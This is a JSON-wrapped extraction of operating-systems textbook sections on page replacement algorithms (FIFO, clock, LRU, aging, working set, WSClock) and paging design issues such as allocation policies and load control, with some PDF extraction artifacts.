            "content": "3.4.3 The First-In, First-Out (FIFO) Page Replacement Algorithm\r\nAnother low-overhead paging algorithm is the FIFO (First-In, First-Out) al\u0002gorithm. To illustrate how this works, consider a supermarket that has enough\r\nshelves to display exactly k different products. One day, some company introduces\r\na new convenience food—instant, freeze-dried, organic yogurt that can be reconsti\u0002tuted in a microwave oven. It is an immediate success, so our finite supermarket\r\nhas to get rid of one old product in order to stock it.\r\nOne possibility is to find the product that the supermarket has been stocking\r\nthe longest (i.e., something it began selling 120 years ago) and get rid of it on the\r\ngrounds that no one is interested any more. In effect, the supermarket maintains a\r\nlinked list of all the products it currently sells in the order they were introduced.\r\nThe new one goes on the back of the list; the one at the front of the list is dropped.\r\nAs a page replacement algorithm, the same idea is applicable. The operating\r\nsystem maintains a list of all pages currently in memory, with the most recent arri\u0002val at the tail and the least recent arrival at the head. On a page fault, the page at\r\nthe head is removed and the new page added to the tail of the list. When applied to\r\nstores, FIFO might remove mustache wax, but it might also remove flour, salt, or\r\nbutter. When applied to computers the same problem arises: the oldest page may\r\nstill be useful. For this reason, FIFO in its pure form is rarely used.\n212 MEMORY MANAGEMENT CHAP. 3"
          },
          "3.4.4 The Second-Chance Page Replacement Algorithm": {
            "page": 243,
            "content": "3.4.4 The Second-Chance Page Replacement Algorithm\r\nA simple modification to FIFO that avoids the problem of throwing out a heav\u0002ily used page is to inspect the R bit of the oldest page. If it is 0, the page is both\r\nold and unused, so it is replaced immediately. If the R bit is 1, the bit is cleared,\r\nthe page is put onto the end of the list of pages, and its load time is updated as\r\nthough it had just arrived in memory. Then the search continues.\r\nThe operation of this algorithm, called second chance, is shown in Fig. 3-15.\r\nIn Fig. 3-15(a) we see pages A through H kept on a linked list and sorted by the\r\ntime they arrived in memory.\r\n(a)\r\nPage loaded first Most recently\r\nloaded page 0\r\nA\r\n3\r\nB\r\n7\r\nC\r\n8\r\nD\r\n12\r\nE\r\n14\r\nF\r\n15\r\nG\r\n18\r\nH\r\n(b)\r\nA is treated like a\r\nnewly loaded page 3\r\nB\r\n7\r\nC\r\n8\r\nD\r\n12\r\nE\r\n14\r\nF\r\n15\r\nG\r\n18\r\nH\r\n20\r\nA\r\nFigure 3-15. Operation of second chance. (a) Pages sorted in FIFO order.\r\n(b) Page list if a page fault occurs at time 20 and A has its R bit set. The numbers\r\nabove the pages are their load times.\r\nSuppose that a page fault occurs at time 20. The oldest page is A, which arriv\u0002ed at time 0, when the process started. If A has the R bit cleared, it is evicted from\r\nmemory, either by being written to the disk (if it is dirty), or just abandoned (if it is\r\nclean). On the other hand, if the R bit is set, A is put onto the end of the list and its\r\n‘‘load time’’ is reset to the current time (20). The R bit is also cleared. The search\r\nfor a suitable page continues with B.\r\nWhat second chance is looking for is an old page that has not been referenced\r\nin the most recent clock interval. If all the pages have been referenced, second\r\nchance degenerates into pure FIFO. Specifically, imagine that all the pages in\r\nFig. 3-15(a) have their R bits set. One by one, the operating system moves the\r\npages to the end of the list, clearing the R bit each time it appends a page to the end\r\nof the list. Eventually, it comes back to page A, which now has its R bit cleared. At\r\nthis point A is evicted. Thus the algorithm always terminates."
          },
          "3.4.5 The Clock Page Replacement Algorithm": {
            "page": 243,
            "content": "3.4.5 The Clock Page Replacement Algorithm\r\nAlthough second chance is a reasonable algorithm, it is unnecessarily inef\u0002ficient because it is constantly moving pages around on its list. A better approach\r\nis to keep all the page frames on a circular list in the form of a clock, as shown in\r\nFig. 3-16. The hand points to the oldest page.\nSEC. 3.4 PA GE REPLACEMENT ALGORITHMS 213\r\nWhen a page fault occurs,\r\nthe page the hand is\r\npointing to is inspected.\r\nThe action taken depends\r\non the R bit:\r\n R = 0: Evict the page\r\n R = 1: Clear R and advance hand\r\nA\r\nB\r\nC\r\nD\r\nE\r\nF\r\nG\r\nH\r\nI\r\nJ\r\nK\r\nL\r\nFigure 3-16. The clock page replacement algorithm.\r\nWhen a page fault occurs, the page being pointed to by the hand is inspected.\r\nIf its R bit is 0, the page is evicted, the new page is inserted into the clock in its\r\nplace, and the hand is advanced one position. If R is 1, it is cleared and the hand is\r\nadvanced to the next page. This process is repeated until a page is found with\r\nR = 0. Not surprisingly, this algorithm is called clock."
          },
          "3.4.6 The Least Recently Used (LRU) Page Replacement Algorithm": {
            "page": 244,
            "content": "3.4.6 The Least Recently Used (LRU) Page Replacement Algorithm\r\nA good approximation to the optimal algorithm is based on the observation\r\nthat pages that have been heavily used in the last few instructions will probably be\r\nheavily used again soon. Conversely, pages that have not been used for ages will\r\nprobably remain unused for a long time. This idea suggests a realizable algorithm:\r\nwhen a page fault occurs, throw out the page that has been unused for the longest\r\ntime. This strategy is called LRU (Least Recently Used) paging.\r\nAlthough LRU is theoretically realizable, it is not cheap by a long shot. To\r\nfully implement LRU, it is necessary to maintain a linked list of all pages in mem\u0002ory, with the most recently used page at the front and the least recently used page\r\nat the rear. The difficulty is that the list must be updated on every memory refer\u0002ence. Finding a page in the list, deleting it, and then moving it to the front is a very\r\ntime consuming operation, even in hardware (assuming that such hardware could\r\nbe built).\r\nHowever, there are other ways to implement LRU with special hardware. Let\r\nus consider the simplest way first. This method requires equipping the hardware\r\nwith a 64-bit counter, C, that is automatically incremented after each instruction.\r\nFurthermore, each page table entry must also have a field large enough to contain\r\nthe counter. After each memory reference, the current value of C is stored in the\n214 MEMORY MANAGEMENT CHAP. 3\r\npage table entry for the page just referenced. When a page fault occurs, the operat\u0002ing system examines all the counters in the page table to find the lowest one. That\r\npage is the least recently used."
          },
          "3.4.7 Simulating LRU in Software": {
            "page": 245,
            "content": "3.4.7 Simulating LRU in Software\r\nAlthough the previous LRU algorithm is (in principle) realizable, few, if any,\r\nmachines have the required hardware. Instead, a solution that can be implemented\r\nin software is needed. One possibility is called the NFU (Not Frequently Used)\r\nalgorithm. It requires a software counter associated with each page, initially zero.\r\nAt each clock interrupt, the operating system scans all the pages in memory. For\r\neach page, the R bit, which is 0 or 1, is added to the counter. The counters roughly\r\nkeep track of how often each page has been referenced. When a page fault occurs,\r\nthe page with the lowest counter is chosen for replacement.\r\nThe main problem with NFU is that it is like an elephant: it never forgets any\u0002thing. For example, in a multipass compiler, pages that were heavily used during\r\npass 1 may still have a high count well into later passes. In fact, if pass 1 happens\r\nto have the longest execution time of all the passes, the pages containing the code\r\nfor subsequent passes may always have lower counts than the pass-1 pages. Conse\u0002quently, the operating system will remove useful pages instead of pages no longer\r\nin use.\r\nFortunately, a small modification to NFU makes it able to simulate LRU quite\r\nwell. The modification has two parts. First, the counters are each shifted right 1 bit\r\nbefore the R bit is added in. Second, the R bit is added to the leftmost rather than\r\nthe rightmost bit.\r\nFigure 3-17 illustrates how the modified algorithm, known as aging, works.\r\nSuppose that after the first clock tick the R bits for pages 0 to 5 have the values 1,\r\n0, 1, 0, 1, and 1, respectively (page 0 is 1, page 1 is 0, page 2 is 1, etc.). In other\r\nwords, between tick 0 and tick 1, pages 0, 2, 4, and 5 were referenced, setting their\r\nR bits to 1, while the other ones remained 0. After the six corresponding counters\r\nhave been shifted and the R bit inserted at the left, they hav e the values shown in\r\nFig. 3-17(a). The four remaining columns show the six counters after the next four\r\nclock ticks.\r\nWhen a page fault occurs, the page whose counter is the lowest is removed. It\r\nis clear that a page that has not been referenced for, say, four clock ticks will have\r\nfour leading zeros in its counter and thus will have a lower value than a counter\r\nthat has not been referenced for three clock ticks.\r\nThis algorithm differs from LRU in two important ways. Consider pages 3 and\r\n5 in Fig. 3-17(e). Neither has been referenced for two clock ticks; both were refer\u0002enced in the tick prior to that. According to LRU, if a page must be replaced, we\r\nshould choose one of these two. The trouble is, we do not know which of them was\r\nreferenced last in the interval between tick 1 and tick 2. By recording only 1 bit\r\nper time interval, we have now lost the ability to distinguish references early in the\nSEC. 3.4 PA GE REPLACEMENT ALGORITHMS 215\r\nPage\r\n0\r\n1\r\n2\r\n3\r\n4\r\n5 \r\nR bits for\r\npages 0-5,\r\nclock tick 0\r\n10000000\r\n00000000\r\n10000000\r\n00000000\r\n10000000\r\n10000000\r\n1 0 1 0 1 1\r\n(a)\r\nR bits for\r\npages 0-5,\r\nclock tick 1\r\n11000000\r\n10000000\r\n01000000\r\n00000000\r\n11000000\r\n01000000\r\n1 1 0 0 1 0\r\n(b)\r\nR bits for\r\npages 0-5,\r\nclock tick 2\r\n11100000\r\n11000000\r\n00100000\r\n10000000\r\n01100000\r\n10100000\r\n1 1 0 1 0 1\r\n(c)\r\nR bits for\r\npages 0-5,\r\nclock tick 3\r\n11110000\r\n01100000\r\n00010000\r\n01000000\r\n10110000\r\n01010000\r\n1 0 0 0 1 0\r\n(d)\r\nR bits for\r\npages 0-5,\r\nclock tick 4\r\n01111000\r\n10110000\r\n10001000\r\n00100000\r\n01011000\r\n00101000\r\n0 1 1 0 0 0\r\n(e)\r\nFigure 3-17. The aging algorithm simulates LRU in software. Shown are six\r\npages for fiv e clock ticks. The fiv e clock ticks are represented by (a) to (e).\r\nclock interval from those occurring later. All we can do is remove page 3, because\r\npage 5 was also referenced two ticks earlier and page 3 was not.\r\nThe second difference between LRU and aging is that in aging the counters\r\nhave a finite number of bits (8 bits in this example), which limits its past horizon.\r\nSuppose that two pages each have a counter value of 0. All we can do is pick one\r\nof them at random. In reality, it may well be that one of the pages was last refer\u0002enced nine ticks ago and the other was last referenced 1000 ticks ago. We hav e no\r\nway of seeing that. In practice, however, 8 bits is generally enough if a clock tick\r\nis around 20 msec. If a page has not been referenced in 160 msec, it probably is\r\nnot that important."
          },
          "3.4.8 The Working Set Page Replacement Algorithm": {
            "page": 246,
            "content": "3.4.8 The Working Set Page Replacement Algorithm\r\nIn the purest form of paging, processes are started up with none of their pages\r\nin memory. As soon as the CPU tries to fetch the first instruction, it gets a page\r\nfault, causing the operating system to bring in the page containing the first instruc\u0002tion. Other page faults for global variables and the stack usually follow quickly.\r\nAfter a while, the process has most of the pages it needs and settles down to run\r\nwith relatively few page faults. This strategy is called demand paging because\r\npages are loaded only on demand, not in advance.\r\nOf course, it is easy enough to write a test program that systematically reads all\r\nthe pages in a large address space, causing so many page faults that there is not\n216 MEMORY MANAGEMENT CHAP. 3\r\nenough memory to hold them all. Fortunately, most processes do not work this\r\nway. They exhibit a locality of reference, meaning that during any phase of ex\u0002ecution, the process references only a relatively small fraction of its pages. Each\r\npass of a multipass compiler, for example, references only a fraction of all the\r\npages, and a different fraction at that.\r\nThe set of pages that a process is currently using is its working set (Denning,\r\n1968a; Denning, 1980). If the entire working set is in memory, the process will\r\nrun without causing many faults until it moves into another execution phase (e.g.,\r\nthe next pass of the compiler). If the available memory is too small to hold the en\u0002tire working set, the process will cause many page faults and run slowly, since ex\u0002ecuting an instruction takes a few nanoseconds and reading in a page from the disk\r\ntypically takes 10 msec At a rate of one or two instructions per 10 msec, it will\r\ntake ages to finish. A program causing page faults every few instructions is said to\r\nbe thrashing (Denning, 1968b).\r\nIn a multiprogramming system, processes are often moved to disk (i.e., all their\r\npages are removed from memory) to let others have a turn at the CPU. The ques\u0002tion arises of what to do when a process is brought back in again. Technically,\r\nnothing need be done. The process will just cause page faults until its working set\r\nhas been loaded. The problem is that having numerous page faults every time a\r\nprocess is loaded is slow, and it also wastes considerable CPU time, since it takes\r\nthe operating system a few milliseconds of CPU time to process a page fault.\r\nTherefore, many paging systems try to keep track of each process’ working set\r\nand make sure that it is in memory before letting the process run. This approach is\r\ncalled the working set model (Denning, 1970). It is designed to greatly reduce the\r\npage fault rate. Loading the pages before letting processes run is also called\r\nprepaging. Note that the working set changes over time.\r\nIt has long been known that programs rarely reference their address space uni\u0002formly, but that the references tend to cluster on a small number of pages. A mem\u0002ory reference may fetch an instruction or data, or it may store data. At any instant\r\nof time, t, there exists a set consisting of all the pages used by the k most recent\r\nmemory references. This set, w(k, t), is the working set. Because the k = 1 most\r\nrecent references must have used all the pages used by the k > 1 most recent refer\u0002ences, and possibly others, w(k, t) is a monotonically nondecreasing function of k.\r\nThe limit of w(k, t) as k becomes large is finite because a program cannot refer\u0002ence more pages than its address space contains, and few programs will use every\r\nsingle page. Figure 3-18 depicts the size of the working set as a function of k.\r\nThe fact that most programs randomly access a small number of pages, but that\r\nthis set changes slowly in time explains the initial rapid rise of the curve and then\r\nthe much slower rise for large k. For example, a program that is executing a loop\r\noccupying two pages using data on four pages may reference all six pages every\r\n1000 instructions, but the most recent reference to some other page may be a mil\u0002lion instructions earlier, during the initialization phase. Due to this asymptotic be\u0002havior, the contents of the working set is not sensitive to the value of k chosen. To\nSEC. 3.4 PA GE REPLACEMENT ALGORITHMS 217\r\nw(k,t)\r\nk\r\nFigure 3-18. The working set is the set of pages used by the k most recent mem\u0002ory references. The function w(k, t) is the size of the working set at time t.\r\nput it differently, there exists a wide range of k values for which the working set is\r\nunchanged. Because the working set varies slowly with time, it is possible to make\r\na reasonable guess as to which pages will be needed when the program is restarted\r\non the basis of its working set when it was last stopped. Prepaging consists of load\u0002ing these pages before resuming the process.\r\nTo implement the working set model, it is necessary for the operating system\r\nto keep track of which pages are in the working set. Having this information also\r\nimmediately leads to a possible page replacement algorithm: when a page fault oc\u0002curs, find a page not in the working set and evict it. To implement such an algo\u0002rithm, we need a precise way of determining which pages are in the working set.\r\nBy definition, the working set is the set of pages used in the k most recent memory\r\nreferences (some authors use the k most recent page references, but the choice is\r\narbitrary). To implement any working set algorithm, some value of k must be cho\u0002sen in advance. Then, after every memory reference, the set of pages used by the\r\nmost recent k memory references is uniquely determined.\r\nOf course, having an operational definition of the working set does not mean\r\nthat there is an efficient way to compute it during program execution. One could\r\nimagine a shift register of length k, with every memory reference shifting the regis\u0002ter left one position and inserting the most recently referenced page number on the\r\nright. The set of all k page numbers in the shift register would be the working set.\r\nIn theory, at a page fault, the contents of the shift register could be read out and\r\nsorted. Duplicate pages could then be removed. The result would be the working\r\nset. However, maintaining the shift register and processing it at a page fault would\r\nboth be prohibitively expensive, so this technique is never used.\r\nInstead, various approximations are used. One commonly used approximation\r\nis to drop the idea of counting back k memory references and use execution time\r\ninstead. For example, instead of defining the working set as those pages used dur\u0002ing the previous 10 million memory references, we can define it as the set of pages\n218 MEMORY MANAGEMENT CHAP. 3\r\nused during the past 100 msec of execution time. In practice, such a definition is\r\njust as good and much easier to work with. Note that for each process, only its\r\nown execution time counts. Thus if a process starts running at time T and has had\r\n40 msec of CPU time at real time T + 100 msec, for working set purposes its time\r\nis 40 msec. The amount of CPU time a process has actually used since it started is\r\noften called its current virtual time. With this approximation, the working set of\r\na process is the set of pages it has referenced during the past τ seconds of virtual\r\ntime.\r\nNow let us look at a page replacement algorithm based on the working set. The\r\nbasic idea is to find a page that is not in the working set and evict it. In Fig. 3-19\r\nwe see a portion of a page table for some machine. Because only pages located in\r\nmemory are considered as candidates for eviction, pages that are absent from\r\nmemory are ignored by this algorithm. Each entry contains (at least) two key items\r\nof information: the (approximate) time the page was last used and the R (Refer\u0002enced) bit. An empty white rectangle symbolizes the other fields not needed for\r\nthis algorithm, such as the page frame number, the protection bits, and the M\r\n(Modified) bit.\r\nInformation about\r\none page 2084\r\n2204 Current virtual time\r\n2003\r\n1980\r\n1213\r\n2014\r\n2020\r\n2032\r\n1620\r\nPage table\r\n1\r\n1\r\n1\r\n0\r\n1\r\n1\r\n1\r\n0\r\nTime of last use\r\nPage referenced\r\nduring this tick\r\nPage not referenced\r\nduring this tick\r\nR (Referenced) bit\r\nScan all pages examining R bit:\r\n if (R == 1)\r\n set time of last use to current virtual time\r\n if (R == 0 and age > τ)\r\n remove this page\r\n if (R == 0 and age ≤ τ)\r\n remember the smallest time\r\nFigure 3-19. The working set algorithm.\r\nThe algorithm works as follows. The hardware is assumed to set the R and M\r\nbits, as discussed earlier. Similarly, a periodic clock interrupt is assumed to cause\r\nsoftware to run that clears the Referenced bit on every clock tick. On every page\r\nfault, the page table is scanned to look for a suitable page to evict.\r\nAs each entry is processed, the R bit is examined. If it is 1, the current virtual\r\ntime is written into the Time of last use field in the page table, indicating that the\nSEC. 3.4 PA GE REPLACEMENT ALGORITHMS 219\r\npage was in use at the time the fault occurred. Since the page has been referenced\r\nduring the current clock tick, it is clearly in the working set and is not a candidate\r\nfor removal (τ is assumed to span multiple clock ticks).\r\nIf R is 0, the page has not been referenced during the current clock tick and\r\nmay be a candidate for removal. To see whether or not it should be removed, its\r\nage (the current virtual time minus its Time of last use) is computed and compared\r\nto τ . If the age is greater than τ , the page is no longer in the working set and the\r\nnew page replaces it. The scan continues updating the remaining entries.\r\nHowever, if R is 0 but the age is less than or equal to τ , the page is still in the\r\nworking set. The page is temporarily spared, but the page with the greatest age\r\n(smallest value of Time of last use) is noted. If the entire table is scanned without\r\nfinding a candidate to evict, that means that all pages are in the working set. In\r\nthat case, if one or more pages with R = 0 were found, the one with the greatest age\r\nis evicted. In the worst case, all pages have been referenced during the current\r\nclock tick (and thus all have R = 1), so one is chosen at random for removal, prefer\u0002ably a clean page, if one exists."
          },
          "3.4.9 The WSClock Page Replacement Algorithm": {
            "page": 250,
            "content": "3.4.9 The WSClock Page Replacement Algorithm\r\nThe basic working set algorithm is cumbersome, since the entire page table has\r\nto be scanned at each page fault until a suitable candidate is located. An improved\r\nalgorithm, which is based on the clock algorithm but also uses the working set\r\ninformation, is called WSClock (Carr and Hennessey, 1981). Due to its simplicity\r\nof implementation and good performance, it is widely used in practice.\r\nThe data structure needed is a circular list of page frames, as in the clock algo\u0002rithm, and as shown in Fig. 3-20(a). Initially, this list is empty. When the first page\r\nis loaded, it is added to the list. As more pages are added, they go into the list to\r\nform a ring. Each entry contains the Time of last use field from the basic working\r\nset algorithm, as well as the R bit (shown) and the M bit (not shown).\r\nAs with the clock algorithm, at each page fault the page pointed to by the hand\r\nis examined first. If the R bit is set to 1, the page has been used during the current\r\ntick so it is not an ideal candidate to remove. The R bit is then set to 0, the hand ad\u0002vanced to the next page, and the algorithm repeated for that page. The state after\r\nthis sequence of events is shown in Fig. 3-20(b).\r\nNow consider what happens if the page pointed to has R = 0, as shown in\r\nFig. 3-20(c). If the age is greater than τ and the page is clean, it is not in the work\u0002ing set and a valid copy exists on the disk. The page frame is simply claimed and\r\nthe new page put there, as shown in Fig. 3-20(d). On the other hand, if the page is\r\ndirty, it cannot be claimed immediately since no valid copy is present on disk. To\r\navoid a process switch, the write to disk is scheduled, but the hand is advanced and\r\nthe algorithm continues with the next page. After all, there might be an old, clean\r\npage further down the line that can be used immediately.\n220 MEMORY MANAGEMENT CHAP. 3\r\n2204 Current virtual time\r\n1213 0\r\n2084 1 2032 1\r\n1620 0\r\n2003 1 2020 1\r\n1980 1 2014 1\r\nTime of\r\nlast use\r\nR bit\r\n(a) (b)\r\n(c) (d)\r\nNew page\r\n1213 0\r\n2084 1 2032 1\r\n1620 0\r\n2003 1 2020 1\r\n1980 1 2014 0\r\n1213 0\r\n2084 1 2032 1\r\n1620 0\r\n2003 1 2020 1\r\n1980 1 2014 0\r\n2204 1\r\n2084 1 2032 1\r\n1620 0\r\n2003 1 2020 1\r\n1980 1 2014 0\r\nFigure 3-20. Operation of the WSClock algorithm. (a) and (b) give an example\r\nof what happens when R = 1. (c) and (d) give an example of R = 0.\r\nIn principle, all pages might be scheduled for disk I/O on one cycle around the\r\nclock. To reduce disk traffic, a limit might be set, allowing a maximum of n pages\r\nto be written back. Once this limit has been reached, no new writes would be\r\nscheduled.\r\nWhat happens if the hand comes all the way around and back to its starting\r\npoint? There are two cases we have to consider:\nSEC. 3.4 PA GE REPLACEMENT ALGORITHMS 221\r\n1. At least one write has been scheduled.\r\n2. No writes have been scheduled.\r\nIn the first case, the hand just keeps moving, looking for a clean page. Since one or\r\nmore writes have been scheduled, eventually some write will complete and its page\r\nwill be marked as clean. The first clean page encountered is evicted. This page is\r\nnot necessarily the first write scheduled because the disk driver may reorder writes\r\nin order to optimize disk performance.\r\nIn the second case, all pages are in the working set, otherwise at least one write\r\nwould have been scheduled. Lacking additional information, the simplest thing to\r\ndo is claim any clean page and use it. The location of a clean page could be kept\r\ntrack of during the sweep. If no clean pages exist, then the current page is chosen\r\nas the victim and written back to disk."
          },
          "3.4.10 Summary of Page Replacement Algorithms": {
            "page": 252,
            "content": "3.4.10 Summary of Page Replacement Algorithms\r\nWe hav e now looked at a variety of page replacement algorithms. Now we\r\nwill briefly summarize them. The list of algorithms discussed is given in Fig. 3-21.\r\nAlgorithm Comment\r\nOptimal Not implementable, but useful as a benchmark\r\nNRU (Not Recently Used) Very crude approximation of LRU\r\nFIFO (First-In, First-Out) Might throw out important pages\r\nSecond chance Big improvement over FIFO\r\nClock Realistic\r\nLRU (Least Recently Used) Excellent, but difficult to implement exactly\r\nNFU (Not Frequently Used) Fair ly cr ude approximation to LRU\r\nAging Efficient algor ithm that approximates LRU well\r\nWorking set Somewhat expensive to implement\r\nWSClock Good efficient algorithm\r\nFigure 3-21. Page replacement algorithms discussed in the text.\r\nThe optimal algorithm evicts the page that will be referenced furthest in the fu\u0002ture. Unfortunately, there is no way to determine which page this is, so in practice\r\nthis algorithm cannot be used. It is useful as a benchmark against which other al\u0002gorithms can be measured, however.\r\nThe NRU algorithm divides pages into four classes depending on the state of\r\nthe R and M bits. A random page from the lowest-numbered class is chosen. This\r\nalgorithm is easy to implement, but it is very crude. Better ones exist.\r\nFIFO keeps track of the order in which pages were loaded into memory by\r\nkeeping them in a linked list. Removing the oldest page then becomes trivial, but\r\nthat page might still be in use, so FIFO is a bad choice.\n222 MEMORY MANAGEMENT CHAP. 3\r\nSecond chance is a modification to FIFO that checks if a page is in use before\r\nremoving it. If it is, the page is spared. This modification greatly improves the\r\nperformance. Clock is simply a different implementation of second chance. It has\r\nthe same performance properties, but takes a little less time to execute the algo\u0002rithm.\r\nLRU is an excellent algorithm, but it cannot be implemented without special\r\nhardware. If this hardware is not available, it cannot be used. NFU is a crude at\u0002tempt to approximate LRU. It is not very good. However, aging is a much better\r\napproximation to LRU and can be implemented efficiently. It is a good choice.\r\nThe last two algorithms use the working set. The working set algorithm gives\r\nreasonable performance, but it is somewhat expensive to implement. WSClock is a\r\nvariant that not only gives good performance but is also efficient to implement.\r\nAll in all, the two best algorithms are aging and WSClock. They are based on\r\nLRU and the working set, respectively. Both give good paging performance and\r\ncan be implemented efficiently. A few other good algorithms exist, but these two\r\nare probably the most important in practice."
          }
        }
      },
      "3.5 DESIGN ISSUES FOR PAGING SYSTEMS": {
        "page": 253,
        "children": {
          "3.5.1 Local versus Global Allocation Policies": {
            "page": 253,
            "content": "3.5.1 Local versus Global Allocation Policies\r\nIn the preceding sections we have discussed several algorithms for choosing a\r\npage to replace when a fault occurs. A major issue associated with this choice\r\n(which we have carefully swept under the rug until now) is how memory should be\r\nallocated among the competing runnable processes.\r\nTake a look at Fig. 3-22(a). In this figure, three processes, A, B, and C, make\r\nup the set of runnable processes. Suppose A gets a page fault. Should the page re\u0002placement algorithm try to find the least recently used page considering only the\r\nsix pages currently allocated to A, or should it consider all the pages in memory?\r\nIf it looks only at A’s pages, the page with the lowest age value is A5, so we get the\r\nsituation of Fig. 3-22(b).\r\nOn the other hand, if the page with the lowest age value is removed without\r\nregard to whose page it is, page B3 will be chosen and we will get the situation of\r\nFig. 3-22(c). The algorithm of Fig. 3-22(b) is said to be a local page replacement\nSEC. 3.5 DESIGN ISSUES FOR PAGING SYSTEMS 223\r\n(a) (b) (c)\r\nA0\r\nA1\r\nA2\r\nA3\r\nA4\r\nA5\r\nB0\r\nB1\r\nB2\r\nB3\r\nB4\r\nB5\r\nB6\r\nC1\r\nC2\r\nC3\r\nA0\r\nA1\r\nA2\r\nA3\r\nA4\r\nA6\r\nB0\r\nB1\r\nB2\r\nB3\r\nB4\r\nB5\r\nB6\r\nC1\r\nC2\r\nC3\r\nA0\r\nA1\r\nA2\r\nA3\r\nA4\r\nA5\r\nB0\r\nB1\r\nB2\r\nA6\r\nB4\r\nB5\r\nB6\r\nC1\r\nC2\r\nC3\r\nAge\r\n10\r\n7\r\n5\r\n4\r\n6\r\n3\r\n9\r\n4\r\n6\r\n2\r\n5\r\n6\r\n12\r\n3\r\n5\r\n6\r\nFigure 3-22. Local versus global page replacement. (a) Original configuration.\r\n(b) Local page replacement. (c) Global page replacement.\r\nalgorithm, whereas that of Fig. 3-22(c) is said to be a global algorithm. Local algo\u0002rithms effectively correspond to allocating every process a fixed fraction of the\r\nmemory. Global algorithms dynamically allocate page frames among the runnable\r\nprocesses. Thus the number of page frames assigned to each process varies in time.\r\nIn general, global algorithms work better, especially when the working set size\r\ncan vary a lot over the lifetime of a process. If a local algorithm is used and the\r\nworking set grows, thrashing will result, even if there are a sufficient number of\r\nfree page frames. If the working set shrinks, local algorithms waste memory. If a\r\nglobal algorithm is used, the system must continually decide how many page\r\nframes to assign to each process. One way is to monitor the working set size as in\u0002dicated by the aging bits, but this approach does not necessarily prevent thrashing.\r\nThe working set may change size in milliseconds, whereas the aging bits are a very\r\ncrude measure spread over a number of clock ticks.\r\nAnother approach is to have an algorithm for allocating page frames to proc\u0002esses. One way is to periodically determine the number of running processes and\r\nallocate each process an equal share. Thus with 12,416 available (i.e., nonoperating\r\nsystem) page frames and 10 processes, each process gets 1241 frames. The remain\u0002ing six go into a pool to be used when page faults occur.\r\nAlthough this method may seem fair, it makes little sense to give equal shares\r\nof the memory to a 10-KB process and a 300-KB process. Instead, pages can be al\u0002located in proportion to each process’ total size, with a 300-KB process getting 30\r\ntimes the allotment of a 10-KB process. It is probably wise to give each process\r\nsome minimum number, so that it can run no matter how small it is. On some\n224 MEMORY MANAGEMENT CHAP. 3\r\nmachines, for example, a single two-operand instruction may need as many as six\r\npages because the instruction itself, the source operand, and the destination oper\u0002and may all straddle page boundaries. With an allocation of only fiv e pages, pro\u0002grams containing such instructions cannot execute at all.\r\nIf a global algorithm is used, it may be possible to start each process up with\r\nsome number of pages proportional to the process’ size, but the allocation has to be\r\nupdated dynamically as the processes run. One way to manage the allocation is to\r\nuse the PFF (Page Fault Frequency) algorithm. It tells when to increase or\r\ndecrease a process’ page allocation but says nothing about which page to replace\r\non a fault. It just controls the size of the allocation set.\r\nFor a large class of page replacement algorithms, including LRU, it is known\r\nthat the fault rate decreases as more pages are assigned, as we discussed above.\r\nThis is the assumption behind PFF. This property is illustrated in Fig. 3-23. Page faults/sec\r\nNumber of page frames assigned\r\nA\r\nB\r\nFigure 3-23. Page fault rate as a function of the number of page frames assigned.\r\nMeasuring the page fault rate is straightforward: just count the number of\r\nfaults per second, possibly taking a running mean over past seconds as well. One\r\neasy way to do this is to add the number of page faults during the immediately pre\u0002ceding second to the current running mean and divide by two. The dashed line\r\nmarked A corresponds to a page fault rate that is unacceptably high, so the faulting\r\nprocess is given more page frames to reduce the fault rate. The dashed line marked\r\nB corresponds to a page fault rate so low that we can assume the process has too\r\nmuch memory. In this case, page frames may be taken away from it. Thus, PFF\r\ntries to keep the paging rate for each process within acceptable bounds.\r\nIt is important to note that some page replacement algorithms can work with\r\neither a local replacement policy or a global one. For example, FIFO can replace\r\nthe oldest page in all of memory (global algorithm) or the oldest page owned by\r\nthe current process (local algorithm). Similarly, LRU or some approximation to it\r\ncan replace the least recently used page in all of memory (global algorithm) or the\r\nleast recently used page owned by the current process (local algorithm). The\r\nchoice of local versus global is independent of the algorithm in some cases.\nSEC. 3.5 DESIGN ISSUES FOR PAGING SYSTEMS 225\r\nOn the other hand, for other page replacement algorithms, only a local strategy\r\nmakes sense. In particular, the working set and WSClock algorithms refer to some\r\nspecific process and must be applied in that context. There really is no working set\r\nfor the machine as a whole, and trying to use the union of all the working sets\r\nwould lose the locality property and not work well."
          },
          "3.5.2 Load Control": {
            "page": 256,
            "content": "3.5.2 Load Control\r\nEven with the best page replacement algorithm and optimal global allocation\r\nof page frames to processes, it can happen that the system thrashes. In fact, when\u0002ev er the combined working sets of all processes exceed the capacity of memory,\r\nthrashing can be expected. One symptom of this situation is that the PFF algorithm\r\nindicates that some processes need more memory but no processes need less mem\u0002ory. In this case, there is no way to give more memory to those processes needing\r\nit without hurting some other processes. The only real solution is to temporarily\r\nget rid of some processes.\r\nA good way to reduce the number of processes competing for memory is to\r\nswap some of them to the disk and free up all the pages they are holding. For ex\u0002ample, one process can be swapped to disk and its page frames divided up among\r\nother processes that are thrashing. If the thrashing stops, the system can run for a\r\nwhile this way. If it does not stop, another process has to be swapped out, and so\r\non, until the thrashing stops. Thus even with paging, swapping may still be needed,\r\nonly now swapping is used to reduce potential demand for memory, rather than to\r\nreclaim pages.\r\nSwapping processes out to relieve the load on memory is reminiscent of two\u0002level scheduling, in which some processes are put on disk and a short-term sched\u0002uler is used to schedule the remaining processes. Clearly, the two ideas can be\r\ncombined, with just enough processes swapped out to make the page-fault rate ac\u0002ceptable. Periodically, some processes are brought in from disk and other ones are\r\nswapped out.\r\nHowever, another factor to consider is the degree of multiprogramming. When\r\nthe number of processes in main memory is too low, the CPU may be idle for sub\u0002stantial periods of time. This consideration argues for considering not only process\r\nsize and paging rate when deciding which process to swap out, but also its charac\u0002teristics, such as whether it is CPU bound or I/O bound, and what characteristics\r\nthe remaining processes have."
          },
          "3.5.3 Page Size": {
            "page": 256,
